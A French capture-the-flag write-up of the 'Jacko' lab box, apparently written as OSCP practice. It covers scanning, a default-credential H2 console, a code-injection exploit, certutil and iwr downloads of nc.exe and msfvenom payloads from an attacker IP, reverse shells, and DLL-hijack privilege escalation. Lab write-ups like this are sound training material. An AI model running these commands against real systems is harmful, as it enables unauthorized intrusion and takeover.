# Jacko

	sudo masscan -p1-65535,U:1-65535 192.168.203.66 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.203.66 -oN nmap.txt
	feroxbuster --silent -u http://192.168.203.66/
	feroxbuster --silent -u http://192.168.203.66:8082/
	
Scans classiques.
 
    80/tcp open http Microsoft IIS httpd 10.0  
    135/tcp open msrpc Microsoft Windows RPC  
    139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
    445/tcp open microsoft-ds?  
    5040/tcp open unknown  
    8082/tcp open http H2 database http console  
    9092/tcp open XmlIpcRegSvc?  
    49664/tcp open msrpc Microsoft Windows RPC  
    49665/tcp open msrpc Microsoft Windows RPC  
    49666/tcp open msrpc Microsoft Windows RPC  
    49667/tcp open msrpc Microsoft Windows RPC  
    49668/tcp open msrpc Microsoft Windows RPC  
    49669/tcp open msrpc Microsoft Windows RPC

Sur l'interface du port 8082, la connexion avec les identifiants par défaut ("sa" / "") marche et on a accès à une console SQL mais il semble ne rien y avoir d'exceptionnel dans la base de données. On voit juste qu'il n'y a pas d'autres utilisateurs dedans, et quelques informations sur l'OS : 

	SELECT * FROM INFORMATION_SCHEMA.SETTINGS;
	SELECT * FROM INFORMATION_SCHEMA.USERS;

En revanche la console elle-même ("H2 1.4.199") semble vulnérable à de l'injection de code : 
<br /> https://www.exploit-db.com/exploits/49384

Il suffit de recopier le code de l'exploit directement dans la console SQL et on a bien le résultat "jacko\tony" pour la commande "whoami" par exemple. Il faut ensuite simplement remplacer la commande dans la ligne suivante : 

    "CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');"

Je n'ai pas réussi à faire fonctionner le moindre reverse-shell directement mais les téléchargements semblent marcher et j'ai trouvé une solution détournée :  

	certutil.exe -urlcache -f http://192.168.45.189/nc.exe  ../../../../../Users/Public/nc.exe
	C:/Users/Public/nc.exe 192.168.45.189 443 -e sh

En relançant le code avec les deux lignes ci-dessus j'obtiens bien une connexion mais le reverse-shell se coupe au bout de quelques secondes. J'ai donc décidé de reproduire cette séquence avec MSFVenom pour fiabiliser le processus : 

    msfvenom  -p windows/shell/reverse_tcp LHOST=192.168.45.189 LPORT=443 -f exe >  /var/www/html/msfvenom.exe
    ...
    rlwrap nc -nvlp 443
    
Et dans la console SQL on répète la procédure avec ces lignes :  

    certutil.exe -urlcache -f http://192.168.45.189/msfvenom.exe  ../../../../../Users/Public/msfvenom.exe
    C:/Users/Public/msfvenom.exe

Les shells continuaient à se fermer directement et j'ai dû passer par Metasploit pour la réception. Je n'ai pas utilisé Meterpreter afin de mieux simuler mes futures conditions d'examen pour l'OSCP, mais cela fonctionne tout aussi bien avec le payload classique : 

    msfconsole -x "use exploit/multi/handler ; set payload windows/shell/reverse_tcp ; set LHOST 192.168.45.189 ; set LPORT 443 ; run ; "
    ...
	C:\Users\tony\Desktop>type local.txt  


### Élévation de privilèges utilisant un CVE : 

Les deux seules difficultés sont la variable PATH mal configurée et le programme Powershell qui semble situé à un autre endroit. Il faut donc au préalable redonner la bonne valeur au PATH puis chercher Powershell manuellement : 

	cd C:\
	set PATH=%SystemRoot%\system32;%SystemRoot%;
	dir "*powershell*" /s
	cd Windows\WinSxS
	dir | findstr "powershell" | findstr "exe"
	cd amd64_microsoft-windows-powershell-exe_31bf3856ad364e35_10.0.18362.1_none_3b736eaf7f6b1264
	powershell.exe -ep bypass

	dir "Program Files (x86)"
	dir "Program Files"
	
	iwr -Uri http://192.168.45.189/exploit_PaperStream.ps1 -Outfile .\exploit.ps1
	iwr -Uri http://192.168.45.189/UninOldIS.dll -Outfile C:\Windows\Temp\UninOldIS.dll
	./exploit.ps1
	

De mon côté : 
    
    msfvenom -p windows/shell_reverse_tcp  LHOST=192.168.45.189 LPORT=9999 -f dll > UninOldIS.dll
	rlwrap nc -nvlp 9999
	...
	C:\Users\Administrator\Desktop>type proof.txt

